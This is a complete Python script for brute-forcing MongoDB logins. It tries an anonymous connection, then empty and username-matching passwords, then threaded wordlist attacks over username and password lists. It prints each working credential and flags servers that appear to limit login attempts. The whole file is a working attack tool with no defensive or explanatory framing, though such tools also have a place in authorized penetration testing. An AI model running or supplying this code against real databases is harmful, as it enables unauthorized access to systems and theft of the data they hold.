import pymongo
from pymongo.errors import ConnectionFailure, OperationFailure, InvalidURI, ConfigurationError
import threading
import argparse
import urllib.parse
import time
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colorama
init(autoreset=True)

# Configurable constants
MAX_CONSECUTIVE_FAILURES = 10  # Threshold for detecting brute-force protection
RETRY_LIMIT = 3                # Number of retry attempts for network issues
RETRY_BACKOFF = 1              # Initial backoff time (seconds) for retries
MAX_THREADS = 10               # Max concurrent threads in the pool

# Attempt to connect to MongoDB with given credentials
def attempt_mongo_login(host, port, username=None, password=None, db_name=None, retry_count=0):
    # Construct MongoDB URI
    if username and password is not None:
        # Encode username and password if provided
        encoded_username = urllib.parse.quote_plus(username)
        encoded_password = urllib.parse.quote_plus(password)
        uri = f"mongodb://{encoded_username}:{encoded_password}@{host}:{port}"
        if db_name:
            uri += f"/{db_name}?directConnection=true"
    else:
        # Anonymous connection (no username, no password, no database)
        uri = f"mongodb://{host}:{port}/?directConnection=true"

    client = None
    try:
        client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=5000)
        client.admin.command('ping')  # Check if the connection is successful
        if username and password is not None:
            print(f"{Fore.LIGHTGREEN_EX}[+] Success: {username}:{password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.LIGHTGREEN_EX}[+] Anonymous connection successful{Style.RESET_ALL}")
        return True
    except (ConnectionFailure, InvalidURI, ConfigurationError) as e:
        # Retry mechanism for network or temporary failures
        if retry_count < RETRY_LIMIT:
            time.sleep(RETRY_BACKOFF * (2 ** retry_count))  # Exponential backoff
            return attempt_mongo_login(host, port, username, password, db_name, retry_count + 1)
        if username and password is not None:
            print(f"{Fore.LIGHTRED_EX}[-] Failed: {username}:{password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.LIGHTRED_EX}[-] Anonymous connection failed{Style.RESET_ALL}")
        return False
    finally:
        if client is not None:
            client.close()

# Load usernames or passwords from file into a list
def load_list(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

def main(host, port, single_username, username_file, password_file, db_name, brute_force_type):
    # Step 1: Attempt anonymous connection
    print(f"{Fore.LIGHTYELLOW_EX}[*] Trying anonymous connection (no username, no password){Style.RESET_ALL}")
    if attempt_mongo_login(host, port):
        print(f"{Fore.LIGHTGREEN_EX}[+] Connected successfully without credentials{Style.RESET_ALL}")
    print()  # Add spacing

    # Load usernames from file if a file is specified
    usernames = load_list(username_file) if username_file else []
    
    # If single username is provided, use it instead of the list
    if single_username:
        usernames.append(single_username)

    # Load passwords from file
    passwords = load_list(password_file)
    found_credentials = []
    consecutive_failures = 0
    brute_force_protection_detected = False
    lock = threading.Lock()

    # Function to attempt login and store successful credentials
    def try_login(username, password):
        nonlocal consecutive_failures, brute_force_protection_detected
        success = attempt_mongo_login(host, port, username, password, db_name)
        
        if success:
            with lock:
                found_credentials.append((username, password))
            consecutive_failures = 0  # Reset failure count on success
        else:
            with lock:
                consecutive_failures += 1
                if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
                    brute_force_protection_detected = True

    # Step 2: Try each username with an empty password
    print(f"{Fore.LIGHTYELLOW_EX}[*] Trying each username with an empty password{Style.RESET_ALL}")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(try_login, username, "") for username in usernames]
        for future in as_completed(futures):
            future.result()
    print()  # Add spacing

    # Step 3: Try each username with username as the password
    print(f"{Fore.LIGHTYELLOW_EX}[*] Trying each username with username as the password{Style.RESET_ALL}")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(try_login, username, username) for username in usernames]
        for future in as_completed(futures):
            future.result()
    print()  # Add spacing

    # Step 4: Test a single username with the entire password list (if -u is specified)
    if single_username:
        print(f"{Fore.LIGHTYELLOW_EX}[*] Testing single username '{single_username}' with password list{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(try_login, single_username, password) for password in passwords]
            for future in as_completed(futures):
                future.result()
        print()  # Add spacing

    # Step 5: Brute-force attempts based on chosen brute-force type
    if brute_force_type == 1:
        print(f"{Fore.LIGHTYELLOW_EX}[*] Brute-forcing: Testing all usernames with each line password{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(try_login, username, password) for username in usernames for password in passwords]
            for future in as_completed(futures):
                future.result()
    elif brute_force_type == 2:
        print(f"{Fore.LIGHTYELLOW_EX}[*] Brute-forcing: Testing each username with each line password sequentially{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for password in passwords:
                for username in usernames:
                    futures.append(executor.submit(try_login, username, password))
                for future in as_completed(futures):
                    future.result()
                futures.clear()  # Clear futures to start fresh with the next password

    # Output the results
    if found_credentials:
        print(f"{Fore.LIGHTGREEN_EX}[*] Brute-force complete. Credentials found:{Style.RESET_ALL}")
        for username, password in found_credentials:
            print(f"{Fore.LIGHTGREEN_EX} - {username}:{password}{Style.RESET_ALL}")
    else:
        print(f"{Fore.LIGHTYELLOW_EX}[*] Brute-force complete. No valid credentials found.{Style.RESET_ALL}")
    
    # Conclusion for brute-force protection detection
    if brute_force_protection_detected:
        print(f"{Fore.LIGHTRED_EX}[!] Warning: Brute-force protection may be enabled on the database. Multiple consecutive failures detected.{Style.RESET_ALL}")

if __name__ == "__main__":
    # Argument parser setup
    parser = argparse.ArgumentParser(description="MongoDB brute-force script")
    parser.add_argument("-H", "--host", required=True, help="MongoDB server IP address")
    parser.add_argument("-P", "--port", type=int, default=27017, help="MongoDB server port")
    parser.add_argument("-u", "--username", help="Single username for MongoDB authentication")
    parser.add_argument("-U", "--username_file", help="File containing list of usernames")
    parser.add_argument("-W", "--password_file", required=True, help="File containing list of passwords")
    parser.add_argument("-D", "--db_name", help="Database name for MongoDB authentication")
    parser.add_argument("-T", "--type", type=int, choices=[1, 2], default=1, help="Brute-force type (1: All usernames with each password; 2: Each username with each password sequentially)")

    args = parser.parse_args()

    # Check that either a single username or a username file is provided
    if not args.username and not args.username_file:
        print("Error: You must provide either a single username with -u or a username file with -U.")
        exit(1)

    main(args.host, args.port, args.username, args.username_file, args.password_file, args.db_name, args.type)
